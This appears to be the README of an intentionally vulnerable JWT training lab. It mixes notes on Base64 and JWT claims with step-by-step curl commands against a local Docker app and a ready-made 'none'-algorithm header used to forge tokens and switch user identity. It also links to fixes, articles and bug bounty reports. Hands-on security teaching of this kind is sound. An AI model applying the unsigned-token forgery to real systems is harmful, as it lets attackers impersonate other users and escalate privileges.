# Python-JWT-Hs256-None

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.

https://jwt.io/

---------------------------------------------------Encoding
- Encoding is a process of convert data from one format to another.
- Encryption is a process to convert the information into a cipher using keys, to maintain the confidentiality.
- Hashing is a procees (technique) to ensure the integrity of the data by converting it into a fixed-length string

Encoding -> 
is a process of convershen of data from one format to another.
* Encoding is not used to security purpose 
* It is a technique in which the data is transformed 
* There is no use of any “Key” in encoding
* The example of such algorithms are ASCII, Unicode, Base64 etc.
How does Base64 Encoding works ? Convert the characters in the string into decimal.
* Base64 is common into Anroid app - Decemal Value 115 s
Why ? urlbased64 JWT  + relpaced by - , / replaced by _ , = are ommited
* use on upload image for inline rendering on Minioo - binary data and ship a cross network fo normalize
          
---------------------------------------------------JWT---------------------------------------------------
is  securely transmitting information between parties as a JSON object

● Stateless session management, no session cookies --> Headers
● Once configured (establishes trust), backend doesn’t need to talk to
authorization server

Base64 vs Base64url encoding
+(Plus) is replaces by - (mines)
/ (slash) is replaced by _(underscore)
= (padding characters) are deleted 

------
alg : only allow specific algorithm(s)
kid : The reserved kid claim represents a key identifier, helping the receiver to find the right key
jku : The reserved jku claim represents a URL pointing to a set of public keys that can be used to verify the signature
x5u : X5u reserved claim represents the location of an X.509 certificate (TLS certificate)
iss	Issuer : The identity of the party who issued the token.
iat	Issued At	: The Unix timestamp of when the token was issued.

--------
JWT storage - cookie XSS protections (HttpOnly & secure flags) are not

available for browser local/session storage.

Best practice - memory-only JWT token handling.

Protection of the crypto keys (server side). JWE


Protection against CSRF - it’s not JWT tokens, it’s about how you use them 


## Owasp

https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.md


![Getting Started](20.png)


## SAST Tools : 


Find With SAST Tools : My Yml Script


![Getting Started](21.png)



## Setup

install from my dockerhub : https://hub.docker.com/r/mhnamadi/jwt-none


    docker run -ti -p 8008:5000 mhnamadi/jwt-none


## Payload 

* curl --header "Content-Type: application/json" --request POST --data '{"username":"admin","password":"admin"}' http://localhost:5000/auth


* curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:5000/protected

* Null cipher header: eyJ0eXAiOiJKV1QiLCAiYWxnIjoiTk9ORSJ9.

## Attack


1 . curl --header "Content-Type: application/json" --request POST --data '{"username":"user","password":"user"}' http://localhost:8008/auth

{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDQ4NTQyODUsImlhdCI6MTY0NDg1Mzk4NSwibmJmIjoxNjQ0ODUzOTg1LCJpZGVudGl0eSI6MX0.mBCLVmIjOQT4a596r7sHvKgPm60ZgZjXBzSGZPKLRp0"

2 . curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:8008/protected


3 . curl --header "Content-Type: application/json" --request POST --data '{"username":"user2","password":"user2"}' http://localhost:8008/auth

{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDQ4NTQzNTcsImlhdCI6MTY0NDg1NDA1NywibmJmIjoxNjQ0ODU0MDU3LCJpZGVudGl0eSI6Mn0.6EdraNQoS8p9lsCzbmSm4XOEg4pQKwFfGoEq85le8sA"

4 . curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:8008/protected


5 . Change ID 1 to 2 and add Null payload on https://jwt.io/ 

6 . Add Null cipher header: eyJ0eXAiOiJKV1QiLCAiYWxnIjoiTk9ORSJ9. 


![Getting Started](11.png)

## Fix Hint :  

https://curity.io/resources/learn/jwt-best-practices/

## Twitter & Facebook Contributor :
   
 https://www.linkedin.com/in/mohammad-hussein-namadi-775baa131/
 
 https://twitter.com/siavashvafshar
 
 https://twitter.com/Dmitriy_area51

    
## Fix 

We encourage you to contribute to Project and Fix Codes

If you want to pull request please follow this :

CONTRIBUTION.md
   
## Learn More 
    
    Using JWT? You need avoid these implementation mistakes

https://www.websecuritylens.org/common-jwt-implementation-mistakes-and-how-to-exploit-them/

    Critical vulnerabilities in JSON Web Token libraries

https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

    IDOR IN JWT AND THE SHORTEST TOKEN YOU WILL EVER SEE {}.{“uid”: “1234567890”}

https://infosecwriteups.com/idor-in-jwt-and-the-shortest-token-you-will-ever-see-uid-1234567890-4e02377ea03a

    Attacking JSON Web Tokens (JWTs)

https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb

    ATTACKING JWT FOR BEGINNERS!

https://www.youtube.com/watch?v=ghfmx4pr1Qg

https://github.com/h-a-c/jwt-lab

https://github.com/farah-hawa/Jwt-code

https://github.com/jmaxxz/jwtbrute

https://github.com/brendan-rius/c-jwt-cracker

    Hack JWT using JSON Web Tokens Attacker BurpSuite extensions

https://www.youtube.com/watch?v=SuDN35-aefY

    The-Hackers-Guide-to-JWT-Security.pdf

https://www.jfokus.se/jfokus20-preso/The-Hackers-Guide-to-JWT-Security.pdf

    Privilege Escalation like a Boss

https://medium.com/@janijay007/privilege-escalation-like-a-boss-7deb638a5c1b

    jwt_security_cheatsheet.pdf

https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf

    Jwt == insecurity?

https://www.slideshare.net/snyff/jwt-insecurity

## Report Bounty 

1. https://blog.assetnote.io/2022/01/17/workspace-one-access-ssrf/
2. https://infosecwriteups.com/hacktoberfest2k21-vulnerability-how-users-metadata-can-be-changed-via-auth-jwt-tokens-leaking-from-3028f8ad6991
3. https://infosecwriteups.com/eye-for-an-eye-unusual-single-click-jwt-token-takeover-2e58f88cf44d
4. https://www.shawarkhan.com/2019/01/hijacking-accounts-by-retrieving-jwt.html
5. https://infosecwriteups.com/idor-in-jwt-and-the-shortest-token-you-will-ever-see-uid-1234567890-4e02377ea03a
6. https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/
7. https://medium.com/@andreashappe/jwt-signature-vs-mac-attacks-d44058b18bf8
8. https://blog.intigriti.com/2020/04/21/bug-bytes-67-hacking-containers-auth0-bypass-hussein98ds-methodologies/
9. https://insomniasec.com/blog/auth0-jwt-validation-bypass
10. https://hackerone.com/reports/896649
11. https://hackerone.com/reports/1210502
12. https://hackerone.com/reports/1103582
13. https://hackerone.com/reports/638635
14. https://hackerone.com/reports/853145
15. https://hackerone.com/reports/736522
16. https://hackerone.com/reports/895172
17. https://hackerone.com/reports/158330
18. https://hackerone.com/reports/748214
19. https://hackerone.com/reports/638635
20. [authmagic-timerange-stateless-core] Improper Authentication https://hackerone.com/reports/736522
21. [jitsi-meet] Authentication Bypass when using JWT w/ public keys https://hackerone.com/reports/1210502 https://github.com/jitsi/jitsi-meet/security/advisories/GHSA-45ff-37jm-xjfx

